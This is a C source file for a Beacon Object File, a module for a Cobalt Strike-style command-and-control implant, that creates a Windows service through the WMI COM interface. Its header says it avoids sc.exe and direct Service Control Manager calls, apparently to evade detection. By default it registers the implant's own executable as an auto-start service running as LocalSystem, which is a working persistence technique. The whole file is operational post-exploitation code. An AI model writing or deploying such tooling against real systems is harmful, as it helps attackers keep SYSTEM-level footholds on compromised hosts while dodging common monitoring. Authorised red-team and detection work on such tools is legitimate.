/*
 * svc_create_com.c — Create a Windows service via WMI COM interface.
 *
 * Uses IWbemLocator / IWbemServices COM interfaces to call
 * Win32_Service.Create(). No sc.exe or direct SCM API is used.
 *
 * Args: "<service_name>" or "<service_name> <exe_path>"
 *   If exe_path is omitted, defaults to the current process executable path.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c svc_create_com.c -o svc_create_com.o
 */

#include <windows.h>
#include "beacon.h"

/* ── DLL Imports ── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(const GUID*, void*, DWORD, const GUID*, void**);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(void*, DWORD, DWORD, WCHAR*, DWORD, DWORD, void*, DWORD);

DECLSPEC_IMPORT WCHAR*  WINAPI OLEAUT32$SysAllocString(const WCHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(WCHAR*);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

/* ── Constants ── */
#define CP_ACP_VAL              0
#define COINIT_MULTITHREADED    0x0
#define CLSCTX_INPROC_SERVER    0x1

/* RPC auth constants for CoSetProxyBlanket */
#define RPC_C_AUTHN_WINNT       10
#define RPC_C_AUTHZ_NONE        0
#define RPC_C_AUTHN_LEVEL_CALL  3
#define RPC_C_IMP_LEVEL_IMPERSONATE 3
#define EOAC_NONE               0

/* VARIANT types */
#define MY_VT_I4    3
#define MY_VT_BSTR  8

/* ── COM Vtable indices ── */
#define VT_QI       0
#define VT_RELEASE  2

/* IWbemLocator: IUnknown(0-2) + ConnectServer(3) */
#define WL_CONNECTSERVER 3

/* IWbemServices: IUnknown(0-2) + OpenNamespace(3) ... GetObject(6) ... ExecMethod(24) */
#define WS_GETOBJECT     6
#define WS_EXECMETHOD   24

/* IWbemClassObject: IUnknown(0-2) + GetQualifierSet(3) Get(4) Put(5) ... SpawnInstance(15) ... GetMethod(19) */
#define WC_GET           4
#define WC_PUT           5
#define WC_SPAWNINSTANCE 15
#define WC_GETMETHOD    19

/* vtable accessor */
#define V(obj) (*(void***)(obj))

/* ── VARIANT (16 bytes, matches Windows ABI) ── */
typedef struct {
    USHORT vt;
    USHORT r1, r2, r3;
    union { LONGLONG ll; void* p; long lVal; };
} MYVAR;

/* ── GUIDs ── */
static const GUID CLSID_WbemLocator = {
    0x4590f811, 0x1d3a, 0x11d0,
    {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}
};
static const GUID IID_IWbemLocator = {
    0xdc12a687, 0x737f, 0x11cf,
    {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}
};

/* ── Helpers ── */
static void bof_memset(void* d, int v, unsigned long long n) {
    unsigned char* p = (unsigned char*)d;
    while (n--) *p++ = (unsigned char)v;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}
static int uitoa(char* buf, unsigned long v) {
    if (v == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int ti = 0;
    while (v) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int i = 0; i < ti; i++) buf[i] = tmp[ti - 1 - i];
    return ti;
}

/* Create BSTR from narrow string */
static WCHAR* make_bstr(const char* s) {
    if (!s || !*s) { WCHAR e[] = {0}; return OLEAUT32$SysAllocString(e); }
    WCHAR wb[1024];
    int wl = KERNEL32$MultiByteToWideChar(CP_ACP_VAL, 0, s, -1, wb, 1024);
    if (wl <= 0) return NULL;
    return OLEAUT32$SysAllocString(wb);
}

/* Create BSTR from wide literal */
static WCHAR* make_bstr_w(const WCHAR* ws) {
    return OLEAUT32$SysAllocString(ws);
}

/* Report HRESULT error */
static void report_hr(const char* msg, HRESULT hr) {
    char buf[256];
    int p = 0, ml = bof_strlen(msg);
    bof_memcpy(buf, msg, ml); p += ml;
    buf[p++] = ' '; buf[p++] = '0'; buf[p++] = 'x';
    for (int i = 7; i >= 0; i--) {
        int nib = ((unsigned long)hr >> (i * 4)) & 0xF;
        buf[p++] = nib < 10 ? '0' + nib : 'A' + nib - 10;
    }
    buf[p++] = '\n';
    BeaconOutput(CALLBACK_ERROR, buf, p);
}

/* Safe COM release */
static void com_release(void** pp) {
    if (*pp) {
        ((HRESULT(STDMETHODCALLTYPE*)(void*))(V(*pp)[VT_RELEASE]))(*pp);
        *pp = NULL;
    }
}

/* Make VARIANT with BSTR value */
static void var_bstr(MYVAR* v, WCHAR* bs) {
    bof_memset(v, 0, sizeof(MYVAR));
    v->vt = MY_VT_BSTR;
    v->p = bs;
}

/* Make VARIANT with int value */
static void var_i4(MYVAR* v, long val) {
    bof_memset(v, 0, sizeof(MYVAR));
    v->vt = MY_VT_I4;
    v->lVal = val;
}

/* Win32_Service.Create return code to message */
static const char* svc_retcode(long code) {
    switch (code) {
        case 0:  return "Success";
        case 1:  return "Not Supported";
        case 2:  return "Access Denied";
        case 3:  return "Dependent Services Running";
        case 4:  return "Invalid Service Control";
        case 5:  return "Service Cannot Accept Control";
        case 6:  return "Service Not Active";
        case 7:  return "Service Request Timeout";
        case 8:  return "Unknown Failure";
        case 9:  return "Path Not Found";
        case 10: return "Service Already Running";
        case 11: return "Service Database Locked";
        case 12: return "Service Dependency Deleted";
        case 13: return "Service Dependency Failure";
        case 14: return "Service Disabled";
        case 15: return "Service Logon Failed";
        case 16: return "Service Marked For Deletion";
        case 17: return "Service No Thread";
        case 21: return "Duplicate Service Name";
        case 22: return "Service Already Exists";
        default: return "Unknown Error";
    }
}

/* ═══════════════════════════════════════════════════════════ */

void go(char* args, int alen)
{
    HRESULT hr;
    int comInit = 0;

    void* pLocator     = NULL;
    void* pServices    = NULL;
    void* pClass       = NULL;
    void* pInParamsDef = NULL;
    void* pInParams    = NULL;
    void* pOutParams   = NULL;

    WCHAR* bsNamespace  = NULL;
    WCHAR* bsClassName  = NULL;
    WCHAR* bsMethodName = NULL;
    WCHAR* bsSvcName    = NULL;
    WCHAR* bsDispName   = NULL;
    WCHAR* bsPathName   = NULL;
    WCHAR* bsStartMode  = NULL;

    /* Wide-char parameter names for Put calls */
    WCHAR wName[]        = { 'N','a','m','e', 0 };
    WCHAR wDisplayName[] = { 'D','i','s','p','l','a','y','N','a','m','e', 0 };
    WCHAR wPathName[]    = { 'P','a','t','h','N','a','m','e', 0 };
    WCHAR wServiceType[] = { 'S','e','r','v','i','c','e','T','y','p','e', 0 };
    WCHAR wErrorControl[]= { 'E','r','r','o','r','C','o','n','t','r','o','l', 0 };
    WCHAR wStartMode[]   = { 'S','t','a','r','t','M','o','d','e', 0 };
    WCHAR wReturnValue[] = { 'R','e','t','u','r','n','V','a','l','u','e', 0 };

    /* ── 1. Parse args ── */
    char* input = NULL;
    int input_len = 0;
    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <service_name> [exe_path]\n", 33);
        return;
    }

    /* Split args: service_name [exe_path] */
    char raw[512];
    bof_memset(raw, 0, sizeof(raw));
    int clen = input_len < 511 ? input_len : 511;
    bof_memcpy(raw, input, clen);
    raw[clen] = '\0';

    char* svc_name = raw;
    char* exe_path = NULL;

    for (int i = 0; i < clen; i++) {
        if (raw[i] == ' ') {
            raw[i] = '\0';
            exe_path = raw + i + 1;
            break;
        }
    }

    /* Default to current exe if no path given */
    char self_path[512];
    if (!exe_path || bof_strlen(exe_path) == 0) {
        DWORD plen = KERNEL32$GetModuleFileNameA(NULL, self_path, sizeof(self_path));
        if (plen == 0 || plen >= sizeof(self_path)) {
            BeaconOutput(CALLBACK_ERROR, "[SvcCOM] GetModuleFileName failed\n", 34);
            return;
        }
        self_path[plen] = '\0';
        exe_path = self_path;
    }

    /* ── 2. COM Init ── */
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr >= 0) comInit = 1;
    /* S_FALSE / RPC_E_CHANGED_MODE are acceptable */

    /* ── 3. CoCreateInstance → IWbemLocator ── */
    hr = OLE32$CoCreateInstance(&CLSID_WbemLocator, NULL,
            CLSCTX_INPROC_SERVER, &IID_IWbemLocator, &pLocator);
    if (hr < 0 || !pLocator) {
        report_hr("[SvcCOM] CoCreateInstance(WbemLocator) failed:", hr);
        goto done;
    }

    /* ── 4. ConnectServer("ROOT\\CIMV2") → IWbemServices ── */
    {
        bsNamespace = make_bstr("ROOT\\CIMV2");
        if (!bsNamespace) {
            BeaconOutput(CALLBACK_ERROR, "[SvcCOM] make_bstr namespace failed\n", 36);
            goto done;
        }

        typedef HRESULT (STDMETHODCALLTYPE *pfnCS)(
            void*, WCHAR*, WCHAR*, WCHAR*, WCHAR*, long, WCHAR*, void*, void**);
        hr = ((pfnCS)(V(pLocator)[WL_CONNECTSERVER]))(
            pLocator, bsNamespace, NULL, NULL, NULL, 0, NULL, NULL, &pServices);
        if (hr < 0 || !pServices) {
            report_hr("[SvcCOM] ConnectServer failed:", hr);
            goto done;
        }
    }

    /* ── 5. CoSetProxyBlanket for DCOM security ── */
    OLE32$CoSetProxyBlanket(pServices,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE);

    /* ── 6. GetObject("Win32_Service") → class definition ── */
    {
        bsClassName = make_bstr("Win32_Service");
        if (!bsClassName) {
            BeaconOutput(CALLBACK_ERROR, "[SvcCOM] make_bstr classname failed\n", 36);
            goto done;
        }

        typedef HRESULT (STDMETHODCALLTYPE *pfnGO)(
            void*, WCHAR*, long, void*, void**, void**);
        hr = ((pfnGO)(V(pServices)[WS_GETOBJECT]))(
            pServices, bsClassName, 0, NULL, &pClass, NULL);
        if (hr < 0 || !pClass) {
            report_hr("[SvcCOM] GetObject(Win32_Service) failed:", hr);
            goto done;
        }
    }

    /* ── 7. GetMethod("Create") → input parameters definition ── */
    {
        bsMethodName = make_bstr("Create");

        typedef HRESULT (STDMETHODCALLTYPE *pfnGM)(
            void*, WCHAR*, long, void**, void**);
        hr = ((pfnGM)(V(pClass)[WC_GETMETHOD]))(
            pClass, bsMethodName, 0, &pInParamsDef, NULL);
        if (hr < 0 || !pInParamsDef) {
            report_hr("[SvcCOM] GetMethod(Create) failed:", hr);
            goto done;
        }
    }

    /* ── 8. SpawnInstance → writable input params ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnSI)(void*, long, void**);
        hr = ((pfnSI)(V(pInParamsDef)[WC_SPAWNINSTANCE]))(pInParamsDef, 0, &pInParams);
        if (hr < 0 || !pInParams) {
            report_hr("[SvcCOM] SpawnInstance failed:", hr);
            goto done;
        }
    }

    /* ── 9. Put parameters into pInParams ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnPut)(void*, WCHAR*, long, void*, long);
        MYVAR var;

        /* Name (string) */
        bsSvcName = make_bstr(svc_name);
        var_bstr(&var, bsSvcName);
        hr = ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wName, 0, &var, 0);
        if (hr < 0) { report_hr("[SvcCOM] Put(Name) failed:", hr); goto done; }

        /* DisplayName (string) */
        bsDispName = make_bstr(svc_name);
        var_bstr(&var, bsDispName);
        hr = ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wDisplayName, 0, &var, 0);
        if (hr < 0) { report_hr("[SvcCOM] Put(DisplayName) failed:", hr); goto done; }

        /* PathName (string) */
        bsPathName = make_bstr(exe_path);
        var_bstr(&var, bsPathName);
        hr = ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wPathName, 0, &var, 0);
        if (hr < 0) { report_hr("[SvcCOM] Put(PathName) failed:", hr); goto done; }

        /* ServiceType = 16 (OWN_PROCESS) */
        var_i4(&var, 16);
        ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wServiceType, 0, &var, 0);

        /* ErrorControl = 0 (IGNORE) */
        var_i4(&var, 0);
        ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wErrorControl, 0, &var, 0);

        /* StartMode = "Automatic" */
        bsStartMode = make_bstr("Automatic");
        var_bstr(&var, bsStartMode);
        ((pfnPut)(V(pInParams)[WC_PUT]))(pInParams, wStartMode, 0, &var, 0);
    }

    /* ── 10. ExecMethod("Win32_Service", "Create", pInParams) ── */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnEM)(
            void*, WCHAR*, WCHAR*, long, void*, void*, void**, void**);
        hr = ((pfnEM)(V(pServices)[WS_EXECMETHOD]))(
            pServices, bsClassName, bsMethodName, 0, NULL, pInParams, &pOutParams, NULL);
        if (hr < 0) {
            report_hr("[SvcCOM] ExecMethod(Create) failed:", hr);
            goto done;
        }
    }

    /* ── 11. Get ReturnValue from output ── */
    {
        long retVal = -1;
        if (pOutParams) {
            MYVAR varRet;
            bof_memset(&varRet, 0, sizeof(varRet));

            typedef HRESULT (STDMETHODCALLTYPE *pfnGet)(
                void*, WCHAR*, long, void*, long*, long*);
            hr = ((pfnGet)(V(pOutParams)[WC_GET]))(
                pOutParams, wReturnValue, 0, &varRet, NULL, NULL);
            if (hr >= 0 && varRet.vt == MY_VT_I4) {
                retVal = varRet.lVal;
            }
        }

        char out[768]; int op = 0;
        if (retVal == 0) {
            op = sa(out, op, "[SvcCOM] Service created successfully\n");
            op = sa(out, op, "  Name    : "); op = sa(out, op, svc_name); out[op++] = '\n';
            op = sa(out, op, "  Path    : "); op = sa(out, op, exe_path); out[op++] = '\n';
            op = sa(out, op, "  Start   : Automatic\n");
            op = sa(out, op, "  Account : LocalSystem\n");
            op = sa(out, op, "  Method  : WMI COM (Win32_Service.Create)\n");
            BeaconOutput(CALLBACK_OUTPUT, out, op);
        } else {
            op = sa(out, op, "[SvcCOM] Win32_Service.Create failed (code ");
            if (retVal >= 0) {
                op += uitoa(out + op, (unsigned long)retVal);
            } else {
                op = sa(out, op, "?");
            }
            op = sa(out, op, " - ");
            op = sa(out, op, svc_retcode(retVal));
            op = sa(out, op, ")\n");
            BeaconOutput(CALLBACK_ERROR, out, op);
        }
    }

done:
    /* ── 12. Cleanup COM objects ── */
    com_release(&pOutParams);
    com_release(&pInParams);
    com_release(&pInParamsDef);
    com_release(&pClass);
    com_release(&pServices);
    com_release(&pLocator);

    /* Free BSTRs */
    if (bsNamespace)  OLEAUT32$SysFreeString(bsNamespace);
    if (bsClassName)  OLEAUT32$SysFreeString(bsClassName);
    if (bsMethodName) OLEAUT32$SysFreeString(bsMethodName);
    if (bsSvcName)    OLEAUT32$SysFreeString(bsSvcName);
    if (bsDispName)   OLEAUT32$SysFreeString(bsDispName);
    if (bsPathName)   OLEAUT32$SysFreeString(bsPathName);
    if (bsStartMode)  OLEAUT32$SysFreeString(bsStartMode);

    if (comInit) OLE32$CoUninitialize();
}
